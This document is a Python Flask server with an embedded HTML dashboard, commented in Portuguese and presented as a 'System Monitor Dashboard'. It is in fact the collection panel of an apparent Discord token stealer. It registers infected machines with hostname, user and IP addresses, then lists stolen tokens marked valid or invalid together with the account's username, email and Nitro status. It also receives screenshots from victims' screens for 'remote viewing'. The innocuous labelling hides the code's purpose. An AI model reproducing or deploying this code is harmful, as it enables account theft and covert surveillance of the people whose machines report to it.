#!/usr/bin/env python3
"""
System Monitor Dashboard - Dashboard de Monitoramento de Sistemas
API para coleta de metricas e status de endpoints
Deploy: railway.app
"""

import os
import json
import base64
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Dados em memoria
endpoints = {}
metrics_data = []
endpoint_screenshots = {}

@app.route('/')
def index():
    """Painel principal"""
    return HTML_TEMPLATE

@app.route('/api/register', methods=['POST'])
def register_endpoint():
    """Registra novo endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        
        endpoints[endpoint_id] = {
            'id': endpoint_id,
            'hostname': data.get('hostname', 'Unknown'),
            'user': data.get('user', 'Unknown'),
            'ip_address': data.get('ip_address', 'Unknown'),
            'external_ip': data.get('external_ip', 'Unknown'),
            'platform': data.get('platform', 'Unknown'),
            'ram': data.get('ram', 'Unknown'),
            'timestamp': datetime.now().isoformat(),
            'status': 'online',
            'last_seen': datetime.now().strftime('%H:%M:%S')
        }
        
        print(f"Endpoint registrado: {endpoints[endpoint_id]['hostname']} ({endpoint_id})")
        return jsonify({'status': 'success', 'message': 'Endpoint registered'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/metrics', methods=['POST'])
def receive_metrics():
    """Recebe metricas do endpoint"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        metrics = data.get('metrics', [])
        
        for metric in metrics:
            metric['endpoint_id'] = endpoint_id
            metric['received_at'] = datetime.now().isoformat()
            metrics_data.append(metric)
        
        print(f"{len(metrics)} metricas recebidas de {endpoint_id}")
        return jsonify({'status': 'success', 'metrics_received': len(metrics)})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot', methods=['POST'])
def receive_screenshot():
    """Recebe screenshot para monitoramento remoto"""
    try:
        data = request.json
        endpoint_id = data.get('endpoint_id', 'unknown')
        image_base64 = data.get('image', '')
        
        if image_base64:
            endpoint_screenshots[endpoint_id] = {
                'image': image_base64,
                'timestamp': datetime.now().isoformat()
            }
            print(f"Screenshot recebido de {endpoint_id}")
        
        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/endpoints')
def get_endpoints():
    """Retorna lista de endpoints"""
    return jsonify(list(endpoints.values()))

@app.route('/api/metrics')
def get_metrics():
    """Retorna todas as metricas"""
    return jsonify(metrics_data)

@app.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
def request_screenshot(endpoint_id):
    """Solicita screenshot manual de um endpoint"""
    try:
        # Aqui você implementaria a lógica para enviar um comando
        # para o endpoint específico capturar screenshot
        # Por agora, vamos apenas registrar a solicitação
        print(f"Solicitacao de screenshot manual para: {endpoint_id}")
        return jsonify({
            'status': 'success', 
            'message': f'Screenshot solicitado para {endpoint_id}',
            'timestamp': datetime.now().isoformat()
        })
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/screenshot/<endpoint_id>')
def get_screenshot(endpoint_id):
    """Retorna screenshot de um endpoint"""
    if endpoint_id in endpoint_screenshots:
        return jsonify({
            'image': endpoint_screenshots[endpoint_id]['image'],
            'timestamp': endpoint_screenshots[endpoint_id]['timestamp']
        })
    return jsonify({'error': 'No screenshot available'}), 404

@app.route('/api/stats')
def get_stats():
    """Estatisticas gerais"""
    return jsonify({
        'total_endpoints': len(endpoints),
        'online_endpoints': sum(1 for e in endpoints.values() if e.get('status') == 'online'),
        'total_metrics': len(metrics_data),
        'last_update': datetime.now().strftime('%H:%M:%S')
    })

HTML_TEMPLATE = '''<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Monitor Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            color: #e0e0e0;
            overflow-x: hidden;
        }
        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            pointer-events: none;
        }
        .container {
            position: relative;
            z-index: 1;
            max-width: 1400px;
            margin: 0 auto;
            padding: 40px 20px;
        }
        .header {
            text-align: center;
            margin-bottom: 50px;
        }
        .header h1 {
            font-size: 2.8rem;
            font-weight: 700;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 50%, #6366f1 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -1px;
            margin-bottom: 10px;
        }
        .header p {
            color: #6b7280;
            font-size: 1rem;
            font-weight: 300;
        }
        .update-time {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
            color: #4b5563;
            font-size: 0.85rem;
        }
        .refresh-btn {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }
        .refresh-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(124, 58, 237, 0.4);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 24px;
            margin-bottom: 40px;
        }
        .stat-card {
            background: rgba(17, 17, 27, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.2);
            border-radius: 16px;
            padding: 30px;
            text-align: center;
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            border-color: rgba(124, 58, 237, 0.4);
            transform: translateY(-4px);
            box-shadow: 0 10px 40px rgba(124, 58, 237, 0.15);
        }
        .stat-value {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            line-height: 1;
            margin-bottom: 8px;
        }
        .stat-label {
            color: #6b7280;
            font-size: 0.9rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .tabs-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 30px;
        }
        .tab {
            background: rgba(17, 17, 27, 0.6);
            border: 1px solid rgba(124, 58, 237, 0.2);
            color: #9ca3af;
            padding: 14px 28px;
            border-radius: 12px;
            cursor: pointer;
            font-size: 0.95rem;
            font-weight: 500;
            transition: all 0.3s ease;
        }
        .tab:hover {
            background: rgba(124, 58, 237, 0.1);
            color: #e0e0e0;
        }
        .tab.active {
            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
            color: white;
            border-color: transparent;
            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.4);
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
            animation: fadeIn 0.4s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .cards-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
        }
        .card {
            background: rgba(17, 17, 27, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.15);
            border-radius: 16px;
            padding: 24px;
            transition: all 0.3s ease;
        }
        .card:hover {
            border-color: rgba(124, 58, 237, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }
        .card-title {
            font-size: 1.1rem;
            font-weight: 600;
            color: #f3f4f6;
        }
        .status-badge {
            padding: 6px 14px;
            border-radius: 20px;
            font-size: 0.75rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .status-badge.online {
            background: rgba(34, 197, 94, 0.15);
            color: #22c55e;
            border: 1px solid rgba(34, 197, 94, 0.3);
        }
        .card-info {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }
        .info-item {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        .info-label {
            font-size: 0.75rem;
            color: #6b7280;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .info-value {
            font-size: 0.9rem;
            color: #d1d5db;
            font-weight: 500;
        }
        .token-card {
            background: rgba(17, 17, 27, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.15);
            border-left: 3px solid #a855f7;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 16px;
            font-family: 'JetBrains Mono', monospace;
            transition: all 0.3s ease;
        }
        .token-card:hover {
            border-color: rgba(168, 85, 247, 0.4);
            transform: translateX(4px);
        }
        .token-value {
            font-size: 0.85rem;
            color: #a855f7;
            word-break: break-all;
            margin-bottom: 10px;
        }
        .token-meta {
            display: flex;
            justify-content: space-between;
            font-size: 0.75rem;
            color: #6b7280;
        }
        .token-valid {
            color: #22c55e;
        }
        .screenshot-btn {
            background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9rem;
            font-weight: 500;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(34, 197, 94, 0.3);
            margin-bottom: 20px;
        }
        .screenshot-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(34, 197, 94, 0.4);
        }
        .screenshot-btn:disabled {
            background: #4b5563;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        .screen-controls {
            display: flex;
            align-items: center;
            gap: 16px;
            margin-bottom: 24px;
        }
        .screen-section {
            background: rgba(17, 17, 27, 0.6);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(124, 58, 237, 0.15);
            border-radius: 20px;
            padding: 30px;
        }
        .screen-select {
            width: 100%;
            max-width: 400px;
            padding: 14px 18px;
            background: rgba(10, 10, 15, 0.8);
            border: 1px solid rgba(124, 58, 237, 0.3);
            border-radius: 12px;
            color: #e0e0e0;
            font-size: 0.95rem;
            margin-bottom: 24px;
            cursor: pointer;
            outline: none;
        }
        .screen-select:focus {
            border-color: #a855f7;
            box-shadow: 0 0 20px rgba(168, 85, 247, 0.2);
        }
        .screen-display {
            background: rgba(10, 10, 15, 0.9);
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            min-height: 400px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .live-indicator {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 20px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
        .live-dot {
            width: 8px;
            height: 8px;
            background: #ef4444;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        .screen-image {
            max-width: 100%;
            max-height: 70vh;
            border-radius: 12px;
            border: 1px solid rgba(124, 58, 237, 0.3);
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
        }
        .empty-state {
            color: #4b5563;
            font-size: 1rem;
        }
        .section-title {
            font-size: 1.5rem;
            font-weight: 600;
            color: #f3f4f6;
            margin-bottom: 24px;
            padding-left: 12px;
            border-left: 3px solid #a855f7;
        }
        @media (max-width: 768px) {
            .stats-grid { grid-template-columns: 1fr; }
            .cards-grid { grid-template-columns: 1fr; }
            .header h1 { font-size: 2rem; }
        }
    </style>
</head>
<body>
    <canvas id="particles-canvas"></canvas>
    <div class="container">
        <div class="header">
            <h1>System Monitor Dashboard</h1>
            <p>Monitoramento de Endpoints em Tempo Real</p>
            <div class="update-time">
                <button class="refresh-btn" onclick="location.reload()">Atualizar</button>
                <span id="updateTime">--:--:--</span>
            </div>
        </div>
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-value" id="totalEndpoints">0</div>
                <div class="stat-label">Endpoints</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="onlineEndpoints">0</div>
                <div class="stat-label">Online</div>
            </div>
            <div class="stat-card">
                <div class="stat-value" id="totalMetrics">0</div>
                <div class="stat-label">Metricas</div>
            </div>
        </div>
        <div class="tabs-container">
            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
            <button class="tab" onclick="showTab('metrics')">Metricas</button>
            <button class="tab" onclick="showTab('remote')">Acesso Remoto</button>
        </div>
        <div id="endpoints" class="tab-content active">
            <h2 class="section-title">Endpoints Monitorados</h2>
            <div class="cards-grid" id="endpointsList">
                <div class="empty-state">Carregando...</div>
            </div>
        </div>
        <div id="metrics" class="tab-content">
            <h2 class="section-title">Metricas de Autenticacao</h2>
            <div id="metricsList">
                <div class="empty-state">Carregando...</div>
            </div>
        </div>
        <div id="remote" class="tab-content">
            <h2 class="section-title">Visualizacao Remota</h2>
            <div class="screen-section">
                <div class="screen-controls">
                    <select id="endpointSelect" class="screen-select" onchange="loadScreen()">
                        <option value="">Selecione um endpoint...</option>
                    </select>
                    <button id="screenshotBtn" class="screenshot-btn" onclick="requestScreenshot()" disabled>
                        📸 Capturar Screenshot
                    </button>
                </div>
                <div class="screen-display" id="screenContent">
                    <div class="empty-state">Selecione um endpoint para visualizar</div>
                </div>
            </div>
        </div>
    </div>
    <script>
        const canvas = document.getElementById('particles-canvas');
        const ctx = canvas.getContext('2d');
        let particles = [];
        
        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        
        class Particle {
            constructor() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 2 + 0.5;
                this.speedX = Math.random() * 0.5 - 0.25;
                this.speedY = Math.random() * 0.5 - 0.25;
                this.opacity = Math.random() * 0.5 + 0.1;
            }
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                if (this.x > canvas.width) this.x = 0;
                if (this.x < 0) this.x = canvas.width;
                if (this.y > canvas.height) this.y = 0;
                if (this.y < 0) this.y = canvas.height;
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(168, 85, 247, ${this.opacity})`;
                ctx.fill();
            }
        }
        
        function initParticles() {
            particles = [];
            const count = Math.min(100, Math.floor((canvas.width * canvas.height) / 15000));
            for (let i = 0; i < count; i++) particles.push(new Particle());
        }
        
        function drawConnections() {
            for (let i = 0; i < particles.length; i++) {
                for (let j = i + 1; j < particles.length; j++) {
                    const dx = particles[i].x - particles[j].x;
                    const dy = particles[i].y - particles[j].y;
                    const dist = Math.sqrt(dx * dx + dy * dy);
                    if (dist < 100) {
                        ctx.beginPath();
                        ctx.strokeStyle = `rgba(168, 85, 247, ${0.1 * (1 - dist / 100)})`;
                        ctx.lineWidth = 0.5;
                        ctx.moveTo(particles[i].x, particles[i].y);
                        ctx.lineTo(particles[j].x, particles[j].y);
                        ctx.stroke();
                    }
                }
            }
        }
        
        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => { p.update(); p.draw(); });
            drawConnections();
            requestAnimationFrame(animateParticles);
        }
        
        initParticles();
        animateParticles();
        
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }
        
        function updateTime() {
            document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
        }
        
        async function loadStats() {
            try {
                const res = await fetch('/api/stats');
                const data = await res.json();
                document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
                document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
                document.getElementById('totalMetrics').textContent = data.total_metrics || 0;
            } catch(e) {}
        }
        
        async function loadEndpoints() {
            try {
                const res = await fetch('/api/endpoints');
                const endpoints = await res.json();
                const container = document.getElementById('endpointsList');
                const select = document.getElementById('endpointSelect');
                if (endpoints.length === 0) {
                    container.innerHTML = '<div class="empty-state">Nenhum endpoint conectado</div>';
                    return;
                }
                let selectHtml = '<option value="">Selecione um endpoint...</option>';
                container.innerHTML = endpoints.map(e => {
                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
                    return `
                    <div class="card">
                        <div class="card-header">
                            <span class="card-title">${e.hostname}</span>
                            <span class="status-badge ${e.status}">${e.status}</span>
                        </div>
                        <div class="card-info">
                            <div class="info-item"><span class="info-label">Usuario</span><span class="info-value">${e.user}</span></div>
                            <div class="info-item"><span class="info-label">IP Local</span><span class="info-value">${e.ip_address}</span></div>
                            <div class="info-item"><span class="info-label">IP Externo</span><span class="info-value">${e.external_ip}</span></div>
                            <div class="info-item"><span class="info-label">Plataforma</span><span class="info-value">${e.platform}</span></div>
                            <div class="info-item"><span class="info-label">RAM</span><span class="info-value">${e.ram}</span></div>
                            <div class="info-item"><span class="info-label">Ultimo Acesso</span><span class="info-value">${e.last_seen}</span></div>
                        </div>
                    </div>`;
                }).join('');
                select.innerHTML = selectHtml;
            } catch(e) {}
        }
        
        async function loadMetrics() {
            try {
                const res = await fetch('/api/metrics');
                const metrics = await res.json();
                const container = document.getElementById('metricsList');
                if (metrics.length === 0) {
                    container.innerHTML = '<div class="empty-state">Nenhuma metrica recebida</div>';
                    return;
                }
                container.innerHTML = metrics.map(m => {
                    const acc = m.account || {};
                    const accInfo = acc.username ? `${acc.username} | ${acc.email || 'sem email'} ${acc.premium_type ? '| Nitro' : ''}` : 'Token invalido';
                    return `
                    <div class="token-card">
                        <div class="token-value">${m.token}</div>
                        <div class="token-meta">
                            <span>${m.endpoint_id} | ${m.source}</span>
                            <span class="${m.valid ? 'token-valid' : ''}">${m.valid ? 'Valido' : 'Invalido'}</span>
                        </div>
                        <div style="margin-top: 8px; color: #22c55e; font-size: 0.8rem;">${accInfo}</div>
                    </div>`;
                }).join('');
            } catch(e) {}
        }
        
        async function requestScreenshot() {
            const endpointId = document.getElementById('endpointSelect').value;
            if (!endpointId) return;
            
            const btn = document.getElementById('screenshotBtn');
            btn.disabled = true;
            btn.textContent = '📸 Capturando...';
            
            try {
                const res = await fetch(`/api/request_screenshot/${endpointId}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' }
                });
                const data = await res.json();
                
                if (data.status === 'success') {
                    // Mostra mensagem de sucesso
                    const screenContent = document.getElementById('screenContent');
                    screenContent.innerHTML = `
                        <div style="color: #22c55e; margin-bottom: 20px;">
                            ✅ Screenshot solicitado com sucesso! Aguardando captura...
                        </div>
                        <div class="live-indicator"><span class="live-dot"></span><span>PROCESSANDO</span></div>
                    `;
                    
                    // Tenta carregar o screenshot após alguns segundos
                    setTimeout(() => {
                        loadScreen();
                        btn.disabled = false;
                        btn.textContent = '📸 Capturar Screenshot';
                    }, 3000);
                } else {
                    throw new Error(data.message || 'Erro ao solicitar screenshot');
                }
            } catch (error) {
                document.getElementById('screenContent').innerHTML = `
                    <div style="color: #ef4444;">❌ Erro: ${error.message}</div>
                `;
                btn.disabled = false;
                btn.textContent = '📸 Capturar Screenshot';
            }
        }
        
        async function loadScreen() {
            const endpointId = document.getElementById('endpointSelect').value;
            const screenshotBtn = document.getElementById('screenshotBtn');
            
            if (!endpointId) {
                document.getElementById('screenContent').innerHTML = '<div class="empty-state">Selecione um endpoint para visualizar</div>';
                screenshotBtn.disabled = true;
                return;
            }
            
            screenshotBtn.disabled = false;
            
            try {
                const res = await fetch(`/api/screenshot/${endpointId}`);
                const data = await res.json();
                if (data.image) {
                    document.getElementById('screenContent').innerHTML = `
                        <div class="live-indicator"><span class="live-dot"></span><span>LIVE</span></div>
                        <img class="screen-image" src="data:image/png;base64,${data.image}" alt="Visualizacao remota">
                        <div style="margin-top: 10px; color: #6b7280; font-size: 0.8rem;">
                            Última atualização: ${new Date(data.timestamp).toLocaleString()}
                        </div>
                    `;
                } else {
                    document.getElementById('screenContent').innerHTML = '<div class="empty-state">Sem imagem disponível. Use o botão "Capturar Screenshot" para solicitar uma nova captura.</div>';
                }
            } catch(e) {
                document.getElementById('screenContent').innerHTML = '<div class="empty-state">Erro ao carregar imagem</div>';
            }
        }
        
        loadStats();
        loadEndpoints();
        loadMetrics();
        updateTime();
        
        setInterval(() => {
            loadStats();
            loadEndpoints();
            loadMetrics();
            loadScreen();
            updateTime();
        }, 5000);
    </script>
</body>
</html>
'''

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"Servidor iniciando na porta {port}")
    print(f"Painel: http://localhost:{port}")
    app.run(host='0.0.0.0', port=port, debug=False)
